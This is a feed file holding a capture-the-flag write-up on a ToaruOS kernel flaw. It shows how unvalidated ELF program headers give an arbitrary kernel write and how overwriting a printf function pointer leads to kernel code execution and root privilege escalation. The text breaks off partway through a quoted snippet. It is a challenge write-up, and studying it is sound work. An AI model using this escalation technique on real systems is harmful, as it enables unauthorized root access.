@@ -1,0 +1,315 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Krishna's Blorgh</title><link>https://krsh732.github.io/post/</link><description>Recent content in Posts on Krishna's Blorgh</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 28 Feb 2025 16:50:41 -0500</lastBuildDate><atom:link href="https://krsh732.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>hxp 38C3 CTF: Ser Szwajcarski 🧀</title><link>https://krsh732.github.io/p/hxp-38c3-ctf-ser-szwajcarski/</link><pubDate>Fri, 28 Feb 2025 16:50:41 -0500</pubDate><guid>https://krsh732.github.io/p/hxp-38c3-ctf-ser-szwajcarski/</guid><description>&lt;p>&lt;a class="link" href="https://2024.ctf.link/internal/challenge/9482d38e-3018-4e26-8ef7-29ebcd3df1b1/" target="_blank" rel="noopener"
+>Ser Szwajcarski 🧀&lt;/a> was a baby pwn challenge from &lt;a class="link" href="https://2024.ctf.link/" target="_blank" rel="noopener"
+>hxp 38C3 CTF&lt;/a>.&lt;/p>
+&lt;p>While I &amp;ldquo;took part&amp;rdquo; in the CTF with my good friend &lt;a class="link" href="https://joshsteffen.com/" target="_blank" rel="noopener"
+>Josh&lt;/a> under the team name &amp;ldquo;frfrmode&amp;rdquo;, I wasn&amp;rsquo;t able to do much as I was travelling at the time and had never seen this challenge. Josh, on the other hand, claimed third solve for this challenge while it was live. Shortly after the CTF ended, he suggested I try it myself&amp;hellip;&lt;/p>
+&lt;blockquote>
+&lt;p>[10:58 PM] Josh: also although it&amp;rsquo;s not particularly hard as far as these things go, Ser Szwajcarski 🧀 was pretty cool and i recommend giving it a go if it sounds interesting&lt;/p>&lt;/blockquote>
+&lt;p>&amp;hellip;and so I did.&lt;/p>
+&lt;h2 id="the-challenge">&lt;a href="#the-challenge" class="header-anchor">&lt;/a>The Challenge
+&lt;/h2>&lt;p>The &lt;a class="link" href="https://2024.ctf.link/assets/files/Ser%20Szwajcarski%20%F0%9F%A7%80-b0bf4584e69e3c20.tar.xz" target="_blank" rel="noopener"
+>challenge&lt;/a> has an almost vanilla x86_64 image of &lt;a class="link" href="https://github.com/klange/toaruos" target="_blank" rel="noopener"
+>ToarouOS&lt;/a> &lt;a class="link" href="https://github.com/klange/toaruos/releases/tag/v2.2.0" target="_blank" rel="noopener"
+>v2.2.0&lt;/a> &amp;ndash; a cool hobby OS developed from scratch by &lt;a class="link" href="https://github.com/klange" target="_blank" rel="noopener"
+>K Lange&lt;/a> &amp;ndash; running in a QEMU VM. The changes to the image can be found in &lt;code>build.sh&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar -xf ramdisk.igz etc/master.passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sed -i &lt;span class="s2">&amp;#34;s/root:toor/root:&lt;/span>&lt;span class="k">$(&lt;/span>tr -dc &lt;span class="s1">&amp;#39;A-Za-z0-9&amp;#39;&lt;/span> &amp;lt; /dev/urandom &lt;span class="p">|&lt;/span> head -c 22&lt;span class="k">)&lt;/span>&lt;span class="s2">/g&amp;#34;&lt;/span> etc/master.passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sed -i &lt;span class="s2">&amp;#34;s/local:local/local:&lt;/span>&lt;span class="k">$(&lt;/span>tr -dc &lt;span class="s1">&amp;#39;A-Za-z0-9&amp;#39;&lt;/span> &amp;lt; /dev/urandom &lt;span class="p">|&lt;/span> head -c 22&lt;span class="k">)&lt;/span>&lt;span class="s2">/g&amp;#34;&lt;/span> etc/master.passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sed -i &lt;span class="s2">&amp;#34;s/guest:guest/guest:&lt;/span>&lt;span class="k">$(&lt;/span>tr -dc &lt;span class="s1">&amp;#39;A-Za-z0-9&amp;#39;&lt;/span> &amp;lt; /dev/urandom &lt;span class="p">|&lt;/span> head -c 22&lt;span class="k">)&lt;/span>&lt;span class="s2">/g&amp;#34;&lt;/span> etc/master.passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zcat ramdisk.igz &amp;gt; ramdisk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar --delete -f ramdisk etc/master.passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar -rf ramdisk etc/master.passwd flag.txt --mode&lt;span class="o">=&lt;/span>&lt;span class="m">400&lt;/span> --owner&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> --group&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In words, the passwords for the &lt;code>root&lt;/code>, &lt;code>local&lt;/code> and &lt;code>guest&lt;/code> users are replaced with random values and &lt;code>flag.txt&lt;/code> is added to the root directory (&lt;code>/&lt;/code>) with permissions such that only the &lt;code>root&lt;/code> user can read it.&lt;/p>
+&lt;p>The goal is to use a shell that is exposed by the challenge to leak the contents of &lt;code>/flag.txt&lt;/code>. The catch is that the shell runs as the &lt;code>local&lt;/code> user.&lt;/p>
+&lt;h2 id="vague-possibilities">&lt;a href="#vague-possibilities" class="header-anchor">&lt;/a>Vague Possibilities
+&lt;/h2>&lt;p>ToarouOS might feel familiar to someone that uses Linux. Maybe some of this is in part due to it supporting POSIX somewhat (at least enough to port programs per its &lt;a class="link" href="https://github.com/klange/toaruos/tree/v2.2.0?tab=readme-ov-file#is-toaruos-posix-compliant" target="_blank" rel="noopener"
+>README&lt;/a>). For example, it has &lt;a class="link" href="https://en.wikipedia.org/wiki/File-system_permissions#POSIX_permissions" target="_blank" rel="noopener"
+>file system permissions&lt;/a> like Linux does and even has syscalls such as &lt;code>open&lt;/code>, &lt;code>read&lt;/code> and &lt;code>write&lt;/code> that share the same arguments and flags. It also uses the same executable format (&lt;a class="link" href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank" rel="noopener"
+>ELF&lt;/a>).&lt;/p>
+&lt;p>Down in user-space, it even has programs like &lt;del>vim&lt;/del> &lt;code>bim&lt;/code>, &lt;code>cat&lt;/code> and &lt;code>sudo&lt;/code>. Now, while the &lt;code>local&lt;/code> user is in &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/base/etc/sudoers" target="_blank" rel="noopener"
+>&amp;ldquo;sudoers&amp;rdquo;&lt;/a>, the flag can&amp;rsquo;t be leaked by simply running &lt;code>sudo cat /flag.txt&lt;/code>, as the &lt;code>local&lt;/code> user&amp;rsquo;s password was randomized. Though, the existence of setuid binaries such as &lt;code>sudo&lt;/code> is promising as it opens the opportunity for privilege escalation solely through user-space, if such binaries can be compromised.&lt;/p>
+&lt;p>Alternatively, the flag can be leaked by trying to find vulnerabilities within kernel-space components and code that can be triggered through user-space (eg. file systems, networking, syscalls, etc.).&lt;/p>
+&lt;h2 id="the-exploit">&lt;a href="#the-exploit" class="header-anchor">&lt;/a>The Exploit
+&lt;/h2>&lt;p>The latter was what I went with as it felt cooler and more interesting. After skimming through &lt;a class="link" href="https://github.com/klange/toaruos/tree/v2.2.0/kernel" target="_blank" rel="noopener"
+>kernel-space code&lt;/a> for some time, I landed on the &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/misc/elf64.c" target="_blank" rel="noopener"
+>ELF loader&lt;/a>, where I discovered a vulnerability.&lt;/p>
+&lt;p>&lt;strong>Note:&lt;/strong> To understand this vulnerability, it suffices to know that one of the things an ELF loader does is load applicable segments/sections (eg. code, data, etc.) from the executable file into memory based on the ELF headers.&lt;/p>
+&lt;h3 id="arbitrary-write">&lt;a href="#arbitrary-write" class="header-anchor">&lt;/a>Arbitrary Write
+&lt;/h3>&lt;p>In &lt;a class="link" href="https://github.com/klange/toaruos/blob/4a31a09ba27904b42ee35e8fb1a3c7f87669a2ef/kernel/misc/elf64.c#L322-L336" target="_blank" rel="noopener"
+>kernel/misc/elf64.c#L322-L335&lt;/a>, I spotted the following:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">322
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">323
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">324
+&lt;/span>&lt;/span>&lt;span class="lnt">325
+&lt;/span>&lt;span class="lnt">326
+&lt;/span>&lt;span class="lnt">327
+&lt;/span>&lt;span class="lnt">328
+&lt;/span>&lt;span class="lnt">329
+&lt;/span>&lt;span class="lnt">330
+&lt;/span>&lt;span class="lnt">331
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">332
+&lt;/span>&lt;/span>&lt;span class="lnt">333
+&lt;/span>&lt;span class="lnt">334
+&lt;/span>&lt;span class="lnt">335
+&lt;/span>&lt;span class="lnt">336
+&lt;/span>&lt;span class="lnt">337
+&lt;/span>&lt;span class="lnt">338
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">e_phnum&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">Elf64_Phdr&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">read_fs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">e_phoff&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">e_phentsize&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Elf64_Phdr&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint8_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">phdr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">PT_LOAD&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uintptr_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_vaddr&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_vaddr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_memsz&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mh">0x1000&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">union&lt;/span> &lt;span class="n">PML&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">mmu_get_page&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MMU_GET_MAKE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">mmu_frame_allocate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">page&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MMU_FLAG_WRITABLE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">read_fs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_offset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_filesz&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_vaddr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_filesz&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_memsz&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">phdr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">p_vaddr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...snipped...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here, &lt;code>file&lt;/code> is the executable file that is being executed, and &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/vfs/vfs.c#L168-L184" target="_blank" rel="noopener"
+>&lt;code>read_fs&lt;/code> is a function&lt;/a> that reads from the provided file into memory. The arguments to &lt;code>read_fs&lt;/code> in order are the file, file offset, read size and destination buffer.&lt;/p>
+&lt;p>Based on this, we can see that the above snippet of code is unsafe, as:&lt;/p>
+&lt;ol>
+&lt;li>The program header (&lt;code>phdr&lt;/code>) is read straight from the executable file in L323-L324 without any validation being done.&lt;/li>
+&lt;li>&lt;code>read_fs&lt;/code> in L332 is blindly using values from the &lt;code>phdr&lt;/code> as the read length, size and destination buffer.&lt;/li>
+&lt;/ol>
+&lt;p>Since this code runs in kernel mode, we can craft an executable file that copies any data from itself to any writable memory region &amp;ndash; basically an arbitrary write &amp;ndash; as long as we have a program header with the right values. What are the right values?&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>p_type&lt;/code> needs to be set to &lt;code>PT_LOAD&lt;/code> so it does the copy.&lt;/li>
+&lt;li>&lt;code>p_offset&lt;/code> needs to be set to the file offset of the data we want to copy from the file.&lt;/li>
+&lt;li>&lt;code>p_filesz&lt;/code> needs to be set to the size of the data we want to copy.&lt;/li>
+&lt;li>&lt;code>p_vaddr&lt;/code> needs to point to the destination we want to write to.&lt;/li>
+&lt;li>&lt;code>p_memsz&lt;/code> needs to be set to 0 to prevent side-effects such as the loop in L326-329 or L333-335 from running.&lt;/li>
+&lt;/ul>
+&lt;h3 id="kernel-code-execution">&lt;a href="#kernel-code-execution" class="header-anchor">&lt;/a>Kernel Code Execution
+&lt;/h3>&lt;p>Since there is no &lt;a class="link" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener"
+>Kernel Address Space Layout Randomization (KASLR)&lt;/a>, the arbitrary write can easily be used to hijack kernel code execution. One such way to hijack kernel code execution is by overwriting some function pointer that kernel-space uses and then making the kernel call it. For this purpose, I found the &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/misc/kprintf.c#L26" target="_blank" rel="noopener"
+>&lt;code>printf_output&lt;/code> function pointer&lt;/a> used by the kernel &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/misc/kprintf.c#L359-L370" target="_blank" rel="noopener"
+>&lt;code>printf&lt;/code> function&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">359
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">360
+&lt;/span>&lt;/span>&lt;span class="lnt">361
+&lt;/span>&lt;span class="lnt">362
+&lt;/span>&lt;span class="lnt">363
+&lt;/span>&lt;span class="lnt">364
+&lt;/span>&lt;span class="lnt">365
+&lt;/span>&lt;span class="lnt">366
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">367
+&lt;/span>&lt;/span>&lt;span class="lnt">368
+&lt;/span>&lt;span class="lnt">369
+&lt;/span>&lt;span class="lnt">370
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">cb_printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">user&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf_output&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="kt">uint8_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">fmt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">...)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">va_list&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">va_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fmt&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">xvasprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cb_printf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fmt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">va_end&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">out&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Which, in turn, is used in the &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/sys/syscall.c#L75-L83" target="_blank" rel="noopener"
+>&lt;code>sys_sysfunc&lt;/code> syscall&lt;/a> (that&amp;rsquo;s callable from user-space) when &lt;code>fn&lt;/code> is &lt;code>TOARU_SYS_FUNC_SYNC&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">78
+&lt;/span>&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">82
+&lt;/span>&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">long&lt;/span> &lt;span class="nf">sys_sysfunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* FIXME: Most of these should be top-level, many are hacks/broken in Misaka */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nl">TOARU_SYS_FUNC_SYNC&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* FIXME: There is no sync ability in the VFS at the moment.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * XXX: Should this just be an ioctl on individual devices?
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Or possibly even an ioctl we can send to arbitrary files? */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;sync: not implemented&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">EINVAL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...snipped...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So, if we construct an executable such that the ELF Loader overwrites the &lt;code>printf_output&lt;/code> to somewhere in our own executable at load time and then call the &lt;code>SYS_SYSFUNC&lt;/code> syscall at run-time, we can run our code in kernel mode.&lt;/p>
+&lt;h3 id="privilege-escalation">&lt;a href="#privilege-escalation" class="header-anchor">&lt;/a>Privilege Escalation
+&lt;/h3>&lt;p>While there are many ways to go now that we have kernel code execution, I chose to elevate the privileges of our executable process by changing the user it&amp;rsquo;s running as to &lt;code>root&lt;/code>. This allows our user-space process to read the flag when it previously couldn&amp;rsquo;t due to running as the &lt;code>local&lt;/code> user.&lt;/p>
+&lt;p>For an example of how to do so, we need look no further than the &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/kernel/misc/elf64.c#L277-L280" target="_blank" rel="noopener"
+>ELF loader code itself&lt;/a>, as it needs to change users for setuid binaries:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">277
+&lt;/span>&lt;span class="lnt">278
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">279
+&lt;/span>&lt;/span>&lt;span class="lnt">280
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">mask&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">S_ISUID&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">this_core&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">current_process&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">flags&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PROC_FLAG_TRACE_SYSCALLS&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">PROC_FLAG_TRACE_SIGNALS&lt;/span>&lt;span class="p">)))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* setuid */&lt;/span>
